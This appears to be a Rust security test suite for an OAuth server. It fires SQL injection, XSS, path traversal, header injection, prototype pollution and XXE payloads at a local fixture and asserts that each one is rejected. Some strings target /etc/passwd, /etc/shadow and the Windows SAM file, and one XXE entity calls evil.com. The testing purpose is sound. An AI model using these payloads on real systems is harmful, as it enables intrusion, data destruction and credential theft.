// Security attack simulation and boundary testing

use crate::test_utils::*;
use reqwest::header::{AUTHORIZATION, CONTENT_TYPE, USER_AGENT};
use serde_json::Value;
use std::time::Duration;

mod test_utils;

#[tokio::test]
async fn test_sql_injection_resistance() {
    let fixture = TestFixture::new().await;
    
    let sql_injection_payloads = vec![
        "'; DROP TABLE tokens; --",
        "' OR '1'='1",
        "admin'; UNION SELECT * FROM users; --",
        "1' OR 1=1 #",
        "'; DELETE FROM tokens WHERE 1=1; --",
        "' UNION SELECT password FROM users WHERE username='admin'--",
        "1'; EXEC xp_cmdshell('dir'); --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    ];
    
    for payload in sql_injection_payloads {
        // Test token endpoint
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(format!("grant_type=client_credentials&client_id={}&client_secret={}", 
                payload, fixture.valid_client_secret))
            .send()
            .await
            .unwrap();
        
        // Should return proper error, not succeed or expose internal errors
        assert_ne!(response.status(), 200);
        let response_text = response.text().await.unwrap();
        assert!(!response_text.to_lowercase().contains("sql"));
        assert!(!response_text.to_lowercase().contains("database"));
        assert!(!response_text.to_lowercase().contains("table"));
        
        // Test introspection endpoint
        let response = fixture.client
            .post(&format!("{}/oauth/introspect", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .body(format!("token={}", payload))
            .send()
            .await
            .unwrap();
        
        // Should handle gracefully
        let introspect_data: Value = response.json().await.unwrap();
        assert_eq!(introspect_data.get("active").unwrap(), false);
    }
}

#[tokio::test]
async fn test_xss_protection() {
    let fixture = TestFixture::new().await;
    
    let xss_payloads = vec![
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        "\";alert('XSS');//",
        "<svg onload=alert('XSS')>",
        "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
    ];
    
    for payload in xss_payloads {
        // Test authorization endpoint
        let auth_params = format!(
            "response_type=code&client_id={}&redirect_uri=https://example.com/callback&state={}",
            fixture.valid_client_id, urlencoding::encode(payload)
        );
        
        let response = fixture.client
            .get(&format!("{}/oauth/authorize?{}", fixture.base_url, auth_params))
            .send()
            .await
            .unwrap();
        
        if response.status() == 302 {
            let location = response.headers().get("location").unwrap().to_str().unwrap();
            // Should not contain unescaped script content
            assert!(!location.contains("<script"));
            assert!(!location.contains("javascript:"));
            assert!(!location.contains("onerror="));
        }
        
        // Test error responses don't contain unescaped content
        let response_text = response.text().await.unwrap_or_default();
        assert!(!response_text.contains("<script"));
        assert!(!response_text.contains("javascript:"));
        assert!(!response_text.contains("onerror="));
    }
}

#[tokio::test]
async fn test_csrf_protection() {
    let fixture = TestFixture::new().await;
    
    // Test that state parameter is properly handled
    let (code_verifier, code_challenge) = fixture.generate_pkce_challenge();
    let state_value = "random_csrf_token_12345";
    
    let auth_params = format!(
        "response_type=code&client_id={}&redirect_uri=https://example.com/callback&state={}&code_challenge={}&code_challenge_method=S256",
        fixture.valid_client_id, state_value, code_challenge
    );
    
    let response = fixture.client
        .get(&format!("{}/oauth/authorize?{}", fixture.base_url, auth_params))
        .send()
        .await
        .unwrap();
    
    assert_eq!(response.status(), 302);
    let location = response.headers().get("location").unwrap().to_str().unwrap();
    assert!(location.contains(&format!("state={}", state_value)));
}

#[tokio::test]
async fn test_directory_traversal_resistance() {
    let fixture = TestFixture::new().await;
    
    let directory_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../../etc/shadow",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/log/../../etc/passwd",
    ];
    
    for payload in directory_traversal_payloads {
        // Test with various endpoints
        let endpoints = vec![
            format!("{}/oauth/token", fixture.base_url),
            format!("{}/oauth/introspect", fixture.base_url),
            format!("{}/jwks.json", fixture.base_url),
        ];
        
        for endpoint in endpoints {
            // Test as client_id parameter
            let response = fixture.client
                .post(&endpoint)
                .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
                .body(format!("grant_type=client_credentials&client_id={}", payload))
                .send()
                .await
                .unwrap();
            
            // Should not expose file system contents
            let response_text = response.text().await.unwrap();
            assert!(!response_text.contains("root:"));
            assert!(!response_text.contains("/bin/bash"));
            assert!(!response_text.contains("etc/passwd"));
        }
    }
}

#[tokio::test]
async fn test_timing_attack_resistance() {
    let fixture = TestFixture::new().await;
    
    // Test timing consistency for token validation
    let valid_token = fixture.get_access_token().await;
    let invalid_token = "invalid_token_12345";
    
    let iterations = 20;
    let mut valid_times = Vec::new();
    let mut invalid_times = Vec::new();
    
    for _ in 0..iterations {
        // Test valid token timing
        let start = std::time::Instant::now();
        let _ = fixture.client
            .post(&format!("{}/oauth/introspect", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .body(format!("token={}", valid_token))
            .send()
            .await
            .unwrap();
        valid_times.push(start.elapsed());
        
        // Test invalid token timing
        let start = std::time::Instant::now();
        let _ = fixture.client
            .post(&format!("{}/oauth/introspect", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .body(format!("token={}", invalid_token))
            .send()
            .await
            .unwrap();
        invalid_times.push(start.elapsed());
    }
    
    // Calculate averages
    let valid_avg = valid_times.iter().sum::<Duration>() / valid_times.len() as u32;
    let invalid_avg = invalid_times.iter().sum::<Duration>() / invalid_times.len() as u32;
    
    // Timing difference should be minimal (less than 50% difference)
    let difference_ratio = if valid_avg > invalid_avg {
        valid_avg.as_nanos() as f64 / invalid_avg.as_nanos() as f64
    } else {
        invalid_avg.as_nanos() as f64 / valid_avg.as_nanos() as f64
    };
    
    assert!(difference_ratio < 1.5, "Timing difference too large: {}", difference_ratio);
}

#[tokio::test]
async fn test_rate_limiting_enforcement() {
    let fixture = TestFixture::new().await;
    
    // Enable rate limiting for this test
    std::env::remove_var("DISABLE_RATE_LIMIT");
    std::env::set_var("RATE_LIMIT_REQUESTS_PER_MINUTE", "5");
    
    // Make requests until rate limited
    let mut responses = Vec::new();
    
    for i in 0..10 {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .header("X-Forwarded-For", "192.168.1.100") // Consistent IP for rate limiting
            .body("grant_type=client_credentials")
            .send()
            .await
            .unwrap();
        
        responses.push((i, response.status()));
        
        if response.status() == 429 {
            // Verify rate limit headers
            assert!(response.headers().contains_key("retry-after"));
            break;
        }
    }
    
    // Should eventually get rate limited
    let rate_limited = responses.iter().any(|(_, status)| *status == 429);
    assert!(rate_limited, "Should eventually get rate limited");
    
    // Reset rate limiting
    std::env::set_var("DISABLE_RATE_LIMIT", "1");
}

#[tokio::test]
async fn test_brute_force_protection() {
    let fixture = TestFixture::new().await;
    
    // Attempt multiple failed authentications
    let invalid_credentials = vec![
        ("admin", "password"),
        ("admin", "123456"),
        ("root", "password"),
        ("user", "user"),
        ("test", "test"),
    ];
    
    for (client_id, client_secret) in invalid_credentials {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(AUTHORIZATION, fixture.basic_auth_header(client_id, client_secret))
            .body("grant_type=client_credentials")
            .send()
            .await
            .unwrap();
        
        // Should consistently fail without exposing timing information
        assert_eq!(response.status(), 401);
        
        // Response should not indicate whether username or password is wrong
        let response_text = response.text().await.unwrap();
        assert!(!response_text.to_lowercase().contains("username"));
        assert!(!response_text.to_lowercase().contains("password"));
        assert!(!response_text.to_lowercase().contains("user not found"));
    }
}

#[tokio::test]
async fn test_session_fixation_resistance() {
    let fixture = TestFixture::new().await;
    
    // Test that authorization codes are single-use
    let (code_verifier, code_challenge) = fixture.generate_pkce_challenge();
    
    // Get authorization code
    let auth_params = format!(
        "response_type=code&client_id={}&redirect_uri=https://example.com/callback&code_challenge={}&code_challenge_method=S256",
        fixture.valid_client_id, code_challenge
    );
    
    let auth_response = fixture.client
        .get(&format!("{}/oauth/authorize?{}", fixture.base_url, auth_params))
        .send()
        .await
        .unwrap();
    
    let location = auth_response.headers().get("location").unwrap().to_str().unwrap();
    let url = url::Url::parse(location).unwrap();
    let code = url.query_pairs()
        .find(|(key, _)| key == "code")
        .map(|(_, value)| value.to_string())
        .unwrap();
    
    // Use the code once
    let token_params = format!(
        "grant_type=authorization_code&code={}&redirect_uri=https://example.com/callback&client_id={}&code_verifier={}",
        code, fixture.valid_client_id, code_verifier
    );
    
    let first_response = fixture.client
        .post(&format!("{}/oauth/token", fixture.base_url))
        .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
        .body(&token_params)
        .send()
        .await
        .unwrap();
    
    assert_eq!(first_response.status(), 200);
    
    // Try to use the same code again
    let second_response = fixture.client
        .post(&format!("{}/oauth/token", fixture.base_url))
        .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
        .body(&token_params)
        .send()
        .await
        .unwrap();
    
    assert_eq!(second_response.status(), 400);
}

#[tokio::test]
async fn test_header_injection_resistance() {
    let fixture = TestFixture::new().await;
    
    let header_injection_payloads = vec![
        "normal\r\nX-Injected: malicious",
        "value\nSet-Cookie: evil=true",
        "test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n",
        "value%0d%0aX-Injected:%20header",
    ];
    
    for payload in header_injection_payloads {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(USER_AGENT, payload)
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .body("grant_type=client_credentials")
            .send()
            .await
            .unwrap();
        
        // Should not contain injected headers
        assert!(!response.headers().contains_key("x-injected"));
        assert!(!response.headers().contains_key("set-cookie"));
        
        // Response should be normal or error, not manipulated
        assert!(response.status() == 200 || response.status() == 400 || response.status() == 401);
    }
}

#[tokio::test]
async fn test_prototype_pollution_resistance() {
    let fixture = TestFixture::new().await;
    
    let prototype_pollution_payloads = vec![
        "__proto__[admin]=true",
        "constructor.prototype.admin=true",
        "__proto__.admin=true",
        "prototype.admin=true",
    ];
    
    for payload in prototype_pollution_payloads {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .body(format!("grant_type=client_credentials&{}", payload))
            .send()
            .await
            .unwrap();
        
        // Should handle gracefully
        if response.status() == 200 {
            let token_response: Value = response.json().await.unwrap();
            // Should not have gained admin privileges
            assert!(token_response.get("access_token").is_some());
        }
    }
}

#[tokio::test]
async fn test_deserialization_attacks() {
    let fixture = TestFixture::new().await;
    
    let malicious_json_payloads = vec![
        r#"{"__proto__":{"admin":true}}"#,
        r#"{"constructor":{"prototype":{"admin":true}}}"#,
        r#"{"admin":true,"__proto__":null}"#,
    ];
    
    for payload in malicious_json_payloads {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/json")
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .body(payload)
            .send()
            .await
            .unwrap();
        
        // Should either reject (415 Unsupported Media Type) or handle safely
        assert!(response.status() == 415 || response.status() == 400 || response.status() == 200);
        
        if response.status() == 200 {
            let response_text = response.text().await.unwrap();
            // Should not expose internal state
            assert!(!response_text.contains("__proto__"));
            assert!(!response_text.contains("constructor"));
        }
    }
}

#[tokio::test]
async fn test_xxe_injection_resistance() {
    let fixture = TestFixture::new().await;
    
    let xxe_payloads = vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious">]><foo>&xxe;</foo>"#,
        r#"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]><foo>&xxe;</foo>"#,
    ];
    
    for payload in xxe_payloads {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/xml")
            .header(AUTHORIZATION, fixture.basic_auth_header(&fixture.valid_client_id, &fixture.valid_client_secret))
            .body(payload)
            .send()
            .await
            .unwrap();
        
        // Should reject XML content or handle safely
        assert_ne!(response.status(), 200);
        
        let response_text = response.text().await.unwrap();
        // Should not expose file contents
        assert!(!response_text.contains("root:"));
        assert!(!response_text.contains("localhost"));
        assert!(!response_text.contains("127.0.0.1"));
    }
}

#[tokio::test]
async fn test_buffer_overflow_resistance() {
    let fixture = TestFixture::new().await;
    
    // Test with extremely long inputs
    let long_inputs = vec![
        "A".repeat(10000),
        "B".repeat(100000),
        "C".repeat(1000000),
        format!("client_{}", "D".repeat(50000)),
    ];
    
    for long_input in long_inputs {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(format!("grant_type=client_credentials&client_id={}&client_secret={}", 
                long_input, fixture.valid_client_secret))
            .send()
            .await
            .unwrap();
        
        // Should handle gracefully without crashing
        assert!(response.status() == 400 || response.status() == 413 || response.status() == 401);
        
        // Should not expose internal errors
        let response_text = response.text().await.unwrap();
        assert!(!response_text.to_lowercase().contains("panic"));
        assert!(!response_text.to_lowercase().contains("stack"));
        assert!(!response_text.to_lowercase().contains("overflow"));
    }
}

#[tokio::test]
async fn test_unicode_security_issues() {
    let fixture = TestFixture::new().await;
    
    let unicode_payloads = vec![
        "admin\u{202E}nimda", // Right-to-left override
        "test\u{00A0}user",   // Non-breaking space
        "user\u{FEFF}name",   // Zero-width no-break space
        "admin\u{0000}",      // Null character
        "test\u{FFEF}",       // High Unicode
        "user\u{200B}",       // Zero-width space
    ];
    
    for payload in unicode_payloads {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .header(AUTHORIZATION, fixture.basic_auth_header(payload, &fixture.valid_client_secret))
            .body("grant_type=client_credentials")
            .send()
            .await
            .unwrap();
        
        // Should handle Unicode safely
        assert_eq!(response.status(), 401); // Invalid credentials
        
        let response_text = response.text().await.unwrap();
        assert!(!response_text.contains('\u{202E}'));
        assert!(!response_text.contains('\u{FEFF}'));
    }
}

#[tokio::test]
async fn test_information_disclosure_prevention() {
    let fixture = TestFixture::new().await;
    
    // Test various error conditions
    let test_cases = vec![
        ("invalid_grant", "grant_type=invalid_grant", 400),
        ("missing_client", "grant_type=client_credentials", 400),
        ("invalid_client", "grant_type=client_credentials&client_id=invalid&client_secret=invalid", 401),
        ("malformed_request", "invalid_form_data", 400),
    ];
    
    for (test_name, body, expected_status) in test_cases {
        let response = fixture.client
            .post(&format!("{}/oauth/token", fixture.base_url))
            .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(body)
            .send()
            .await
            .unwrap();
        
        assert_eq!(response.status(), expected_status, "Test case: {}", test_name);
        
        let response_text = response.text().await.unwrap();
        
        // Should not expose internal information
        assert!(!response_text.to_lowercase().contains("stack trace"));
        assert!(!response_text.to_lowercase().contains("internal error"));
        assert!(!response_text.to_lowercase().contains("database"));
        assert!(!response_text.to_lowercase().contains("redis"));
        assert!(!response_text.to_lowercase().contains("panic"));
        assert!(!response_text.to_lowercase().contains("rust"));
        assert!(!response_text.to_lowercase().contains("thread"));
        assert!(!response_text.to_lowercase().contains("file not found"));
        assert!(!response_text.to_lowercase().contains("permission denied"));
        
        // Should not expose sensitive configuration
        assert!(!response_text.contains("SECRET"));
        assert!(!response_text.contains("PASSWORD"));
        assert!(!response_text.contains("private"));
        assert!(!response_text.contains("confidential"));
    }
}

#[tokio::test]
async fn test_concurrent_attack_simulation() {
    let fixture = TestFixture::new().await;
    
    // Simulate concurrent attacks of different types
    let attack_types = vec![
        ("sql_injection", "'; DROP TABLE users; --"),
        ("xss", "<script>alert('xss')</script>"),
        ("brute_force", "admin:password123"),
        ("path_traversal", "../../../etc/passwd"),
    ];
    
    let mut handles = Vec::new();
    
    for (attack_type, payload) in attack_types {
        let fixture_clone = &fixture;
        let client = fixture_clone.client.clone();
        let base_url = fixture_clone.base_url.clone();
        let payload = payload.to_string();
        let attack_type = attack_type.to_string();
        
        let handle = tokio::spawn(async move {
            let mut success_count = 0;
            let mut error_count = 0;
            
            for _ in 0..10 {
                let response = client
                    .post(&format!("{}/oauth/token", base_url))
                    .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
                    .body(format!("grant_type=client_credentials&client_id={}", payload))
                    .send()
                    .await;
                
                match response {
                    Ok(resp) => {
                        if resp.status() == 200 {
                            success_count += 1;
                        } else {
                            error_count += 1;
                        }
                    }
                    Err(_) => error_count += 1,
                }
            }
            
            (attack_type, success_count, error_count)
        });
        
        handles.push(handle);
    }
    
    // Collect results
    for handle in handles {
        let (attack_type, success_count, error_count) = handle.await.unwrap();
        
        // All attacks should fail
        assert_eq!(success_count, 0, "Attack type {} should not succeed", attack_type);
        assert!(error_count > 0, "Attack type {} should generate errors", attack_type);
    }
}